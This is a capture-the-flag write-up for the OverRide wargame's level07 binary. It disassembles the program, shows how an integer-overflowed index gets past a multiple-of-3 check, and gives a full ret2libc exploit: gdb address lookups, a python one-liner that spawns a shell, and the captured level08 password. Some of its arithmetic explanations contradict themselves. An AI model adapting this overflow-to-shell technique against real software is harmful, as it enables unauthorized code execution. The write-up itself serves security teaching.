# **Level07**

in this level we have a program crappy number storage service  you can store and read and quit 

```nasm
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 5498754668
 Index: 44
 Completed store command successfully
Input command: read
 Index: 44
 Number at data[44] is 4294967295
 Completed read command successfully
Input command: quit
level07@OverRide:~$
```

## **Binary Analysis**

The program lets the user store and read numbers. It will quit if the user enters an exit command.

```nasm
; Stack Setup
0x08048726 <+3>:     push   %edi
0x08048727 <+4>:     push   %esi
0x08048728 <+5>:     push   %ebx           ; 3 registers pushed (12 bytes)
0x08048729 <+6>:     and    $0xfffffff0,%esp  ; 16-byte alignment
0x0804872c <+9>:     sub    $0x1d0,%esp    # 464 bytes stack frame
; Initialize numbers array
0x08048791 <+110>:   lea    0x24(%esp),%ebx    ; numbers array at esp+36
0x08048795 <+114>:   mov    $0x0,%eax          ; Value to store (0)
0x0804879a <+119>:   mov    $0x64,%edx         ; Size (100)
0x0804879f <+124>:   mov    %ebx,%edi          ; Destination
0x080487a1 <+126>:   mov    %edx,%ecx          ; Counter
0x080487a3 <+128>:   rep stos %eax,%es:(%edi)  ; Zero the array

; Main Loop
0x08048843 <+288>:   movl   $0x8048b38,(%esp)  ; Print banner
0x0804884a <+295>:   call   puts@plt
0x0804884f <+300>:   mov    $0x8048d4b,%eax    ; "> " prompt
0x08048854 <+305>:   mov    %eax,(%esp)
0x08048857 <+308>:   call   printf@plt

; Read Command
0x08048882 <+351>:   call   fgets@plt          ; Read command
0x08048887 <+356>:   lea    0x1b8(%esp),%eax   ; Command buffer

; Compare Commands
; Check "store"
0x080488c0 <+413>:   mov    $0x8048d5b,%eax    ; "store"
0x080488ca <+423>:   repz cmpsb %es:(%edi),%ds:(%esi)
0x080488e3 <+448>:   call   store_number

; Check "read"
0x08048901 <+478>:   mov    $0x8048d61,%eax    ; "read"
0x08048924 <+513>:   call   read_number

; Check "quit"
0x08048942 <+543>:   mov    $0x8048d66,%eax    ; "quit"
0x08048963 <+576>:   je     0x80489cf          ; Exit if "quit"

; Loop Control
0x08048965 <+578>:   cmpl   $0x0,0x1b4(%esp)   ; Check return value
0x0804896f <+588>:   jmp    main_loop          ; Continue loop

; Exit Cleanup
0x080489d0 <+685>:   mov    $0x0,%eax          ; Return 0
0x080489d5 <+690>:   mov    0x1cc(%esp),%esi   ; Get canary
0x080489dc <+697>:   xor    %gs:0x14,%esi      ; Check canary
0x080489e3 <+704>:   je     0x80489ea          ; If match, continue
0x080489e5 <+706>:   call   __stack_chk_fail   ; If not, fail
```

**Storing a Number (store_number function)**

1. The user enters a number and an index.
2. The number is multiplied by a **magic number**.
3. The result is **shifted right**.
4. The index must be **a multiple of 3**. If not, it shows an error.
5. The number is **shifted right by 24 bits** and compared to `0xb7`.
    - If they **are not equal**, the program continues.

```nasm
; Key Protections
0x08048671 <+65>:    mov    $0xaaaaaaab,%edx    ; Check index % 3
0x0804868d <+93>:    shr    $0x18,%eax          ; Check if number >> 24 == 0xb7
0x08048690 <+96>:    cmp    $0xb7,%eax

; Store Operation
0x080486c5 <+149>:   shl    $0x2,%eax           ; index * 4
0x080486c8 <+152>:   add    0x8(%ebp),%eax      ; Add base address
0x080486ce <+158>:   mov    %edx,(%eax)         ; Store number
```

**Reading a Number (read_number function)**

1. The user enters an index.
2. The index is **multiplied by 4**.
3. The program reads the number at the calculated address.
4. The number is taken from an **array** and printed.

```nasm
;Read Operation
0x080486f9 <+34>:    mov    -0xc(%ebp),%eax     ; Get index
0x080486fc <+37>:    shl    $0x2,%eax           ; index * 4
0x080486ff <+40>:    add    0x8(%ebp),%eax      ; Add base address
0x08048702 <+43>:    mov    (%eax),%edx         ; Read value
```

## **Vulnerability**

The vulnerability in this level is caused by integer overflow when bypassing the index check for being a multiple of 3. This allows the attacker to overwrite the return address on the stack, redirecting execution to the system("/bin/sh") function, which gives the attacker a shell. The overflow lets the attacker store arbitrary values, leading to arbitrary code execution.

```nasm
; Key Protection Checks in store_number:
0x0804866e <+62>:    mov    -0xc(%ebp),%ecx     ; Get index
0x08048671 <+65>:    mov    $0xaaaaaaab,%edx    ; Magic number for div by 3
0x08048678 <+72>:    mul    %edx                ; Check if index % 3 == 0

0x0804868d <+93>:    shr    $0x18,%eax          ; Get highest byte
0x08048690 <+96>:    cmp    $0xb7,%eax          ; Compare with 0xb7

; Address calculation in read_number:
0x080486f9 <+34>:    mov    -0xc(%ebp),%eax     ; Get index
0x080486fc <+37>:    shl    $0x2,%eax           ; index * 4
0x080486ff <+40>:    add    0x8(%ebp),%eax      ; Add base
```

## **Exploit**

The goal is 
. Bypass index check using integer overflow by choosing an invalid index (e.g., 1073741938).

. Overwrite return address with the address of system("/bin/sh").

. Execute exploit by storing the addresses and triggering the overflow to spawn a shell.

**Step 1: Find Important Addresses**

We need to find the addresses of `system` and `/bin/sh`.

```nasm
(gdb) b main
Breakpoint 1 at 0x8048729
(gdb) run
Starting program: /home/users/level07/level07

Breakpoint 1, 0x08048729 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) find &system,+9999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
(gdb)
```

**Step 2: Reach the Return Address**

We calculate the offset to the return address:

- Total Stack Size: 464 bytes (0x1d0)
- Buffer Start offset: esp+36 (0x24)
- Saved Registers: 12 bytes
- Stack Alignment: 16 bytes
- `/4`: Because integers are 4 bytes.

Calculation:

```
(464 - 36 + 12 + 16) / 4 = 114
```

We want to write to index 114, but the program checks that the index must be a multiple of 3. So, we can't use index 114 directly.

### **The Trick**

To bypass this check, we exploit integer overflow. By using an index of `1073741938`, we overflow the index calculation, which leads to the desired address.

**Visual Stack Layout:**

```nasm
High addresses
    ↑
[return address]         <-- We want to reach this
[saved ebp]
[saved registers: 12 bytes]
    - edi (4 bytes)
    - esi (4 bytes)
    - ebx (4 bytes)
[alignment: 16 bytes]
[buffer: 464 bytes]
    - starts at esp+36
    ↓
Low addresses
```

total_size - buffer_start:

- Gives distance from buffer to top of stack

pushed_regs + alignment:

- Adds extra space above stack
1. / 4:
    - Converts bytes to integers
    - Because each array element is 4 bytes

**Step 2:  Integer Overflow Calculation**:

**Integer Overflow**

```python
32-bit unsigned int (uint):
Maximum value: 0xffffffff (4294967295)

When you exceed this:
4294967295 + 1 = 0 (overflows back to 0)
```

**The Calculation**

```python
# Want to reach index 114
max_uint = 0xffffffff          # 4294967295
quarter = max_uint // 4        # 1073741823 (divide by 4)
index = quarter + 114 + 1      # 1073741938

# When program multiplies by 4:
1073741938 * 4 = 4294967752
4294967752 - 4294967296 = 456 (456/4 = 114)
```

**Visual Memory Layout for Integer Overflow**

1. Normal Memory Layou

```
High Memory
+------------------------+
| return address        |  <- We want to reach here (index 114)
+------------------------+
| saved registers       |
+------------------------+
|                       |
|     stack space       |
|                       |
+------------------------+
| array[99]             |
| array[2]              |
| array[1]              |
| array[0]              |  <- Array starts here
+------------------------+
Low Memory
```

2. When Using Normal Index (114)

```
+------------------------+
| return address        | <- Want to write here (index 114)
+------------------------+
|                       |
|                       |
|                       |
+------------------------+
| array[114]            | <- But 114 % 3 = 0 (ERROR!)
+------------------------+
| array[2]              |
| array[1]              |
| array[0]              |
+------------------------+
```

3. Using Integer Overflow (1073741938)

```

Memory Access Pattern:
1073741938 * 4 = 4294967752

+------------------------+
| return address        | <- After overflow, we write here!
+------------------------+
|                       |
|    Memory Space       |
|                       |
+------------------------+
| array[???]            | <- Too big number wraps around
+------------------------+
| array[2]              |
| array[1]              |
| array[0]              |
+------------------------+

Like a circle:
[0]->[1]->[2]->...->MAX->WRAP BACK TO START!
```

4. Final Result

```
When we use index 1073741938:
+------------------------+
| return address        | <- We reach here because:
+------------------------+   1073741938 * 4 = 456 (after overflow)
|                       |   456/4 = 114
|                       |   And 1073741938 % 3 = 1 (passes check!)
|                       |
+------------------------+
| array[...]            |
+------------------------+
| array[2]              |
| array[1]              |
| array[0]              |
+------------------------+

```

**Final Exploit:**

```python
# Store "/bin/sh" string
store_cmd = "store\n"
store_cmd += "4160264172\n"    # 0xf7f897ec ("/bin/sh")
store_cmd += "116\n"           # Index not multiple of 3

# Store system() address
store_cmd += "store\n"
store_cmd += "4159090384\n"    # 0xf7e6aed0 (system)
store_cmd += "1073741938\n"    # Calculated index

store_cmd += "quit\n"
```

```python
(python -c 'print "store\n4160264172\n116\nstore\n4159090384\n1073741938\nquit"'; cat) | ./level07
```

**The resulte:**

```python
level07@OverRide:~$ (python -c 'print "store\n4160264172\n116\nstore\n4159090384\n1073741938\nquit"'; cat) | ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
whoami
level08
 cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC

```

## Flag

```python
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```